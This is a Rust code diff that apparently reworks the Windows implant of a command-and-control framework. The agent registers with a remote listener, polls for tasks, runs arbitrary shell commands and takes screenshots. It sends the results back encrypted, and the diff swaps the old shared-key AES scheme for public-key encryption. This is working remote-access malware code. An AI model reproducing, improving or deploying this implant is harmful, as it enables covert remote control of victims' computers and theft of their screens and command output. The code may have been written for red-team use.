@@ -6,11 +6,11 @@ use windows::core::{Error, HSTRING};
 
 use crate::{
     core::{
-        agents::{AgentData, enc_agentdata},
         handlers::win::{
             async_handler::HRequestAsync,
             handler::{HConnect, HInternet, HRequest, HSession},
         },
+        postdata::{CipherData, PlainData, RegisterAgentData},
         systeminfo::systeminfo_windows::get_computer_name,
         tasks::{
             screenshot::screenshot,
@@ -18,14 +18,16 @@ use crate::{
         },
     },
     Config,
-    crypto::aesgcm::{decode_decrypt, encrypt_encode},
+    crypto::aesgcm::{cipher, decipher, EncMessage},
     utils::random::random_name,
 };
 
 pub async fn run(config: Config) -> Result<(), Error> {
     let sleep = time::Duration::from_secs(config.sleep);
 
-    let hsession = HSession::new()?;
+    let user_agent = HSTRING::from(config.listener.user_agent.to_string());
+
+    let hsession = HSession::new(user_agent)?;
     let mut hconnect = HConnect::new(
         &hsession,
         HSTRING::from(config.listener.host.to_string()),
@@ -47,16 +49,15 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.listener.port.to_owned(),
     );
 
-    let mut ra = AgentData::new(
-        agent_name,
+    let mut rad = RegisterAgentData::new(
+        agent_name.to_string(),
         hostname,
         os,
         arch,
         listener_url,
-        config.key.to_string(),
-        config.nonce.to_string()
+        config.my_public_key,
     );
-    let ra_json = serde_json::to_string(&enc_agentdata(ra.clone())).unwrap();
+    let rad_json = serde_json::to_string(&rad.clone()).unwrap();
 
     // Agent registration process
     let mut registered = false;
@@ -64,15 +65,10 @@ pub async fn run(config: Config) -> Result<(), Error> {
         thread::sleep(sleep);
     
         // Register agent
-        let response = match post(&mut hconnect, "/r".to_owned(), ra_json.to_string()).await {
+        let response = match post(&mut hconnect, "/r".to_owned(), rad_json.to_string()).await {
             Ok(resp) => {
                 registered = true;
-                String::from_utf8(
-                    decode_decrypt(
-                        resp.as_bytes(),
-                        config.key.as_bytes(),
-                        config.nonce.as_bytes()
-                    )).unwrap()
+                resp
             }
             Err(e) => {
                 continue;
@@ -82,23 +78,30 @@ pub async fn run(config: Config) -> Result<(), Error> {
         // println!("{}", response);
     }
 
+    let plaindata = PlainData::new(agent_name.to_string());
+    let plaindata_json = serde_json::to_string(&plaindata).unwrap();
+
     loop {
         // TODO: Implement graceful shutdown.
 
         thread::sleep(sleep);
 
         // Get task
-        let task = match post(&mut hconnect, "/t/a".to_owned(), ra_json.to_string()).await {
+        let task = match post(&mut hconnect, "/t/a".to_owned(), plaindata_json.to_string()).await {
             Ok(resp) => {
-                String::from_utf8(
-                    decode_decrypt(
-                        resp.as_bytes(),
-                        config.key.as_bytes(),
-                        config.nonce.as_bytes()
-                    )).unwrap()
+                if resp == "" {
+                    continue;
+                }
+
+                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
+                let deciphered_task = decipher(
+                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                );
+                String::from_utf8(deciphered_task).unwrap()
             },
             Err(e) => {
-                // println!("Error fetching /t/a: {:?}", e);
                 continue;
             }
         };
@@ -117,30 +120,52 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
         match task_args[0].as_str() {
             "screenshot" => {
-                // Take a screenshot
                 match screenshot().await {
                     Ok(result) => {
-                        ra.task_result = Some(result);
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            &result,
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
+                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                     }
                     Err(e) => {
-                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            e.to_string().as_bytes(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
+                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                     }
                 }
-                let ra_json = serde_json::to_string(&enc_agentdata(ra.clone())).unwrap();
-                post(&mut hconnect, "/t/r".to_owned(), ra_json.to_string()).await;
             }
             "shell" => {
-                // Execute shell command
                 match shell(task_args[1..].join(" ")).await {
                     Ok(result) => {
-                        ra.task_result = Some(result);
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            &result,
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
+                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                     }
                     Err(e) => {
-                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            e.to_string().as_bytes(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
+                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                     }
                 }
-                let ra_json = serde_json::to_string(&enc_agentdata(ra.clone())).unwrap();
-                post(&mut hconnect, "/t/r".to_owned(), ra_json.to_string()).await;
             }
             _ => {
                 continue;
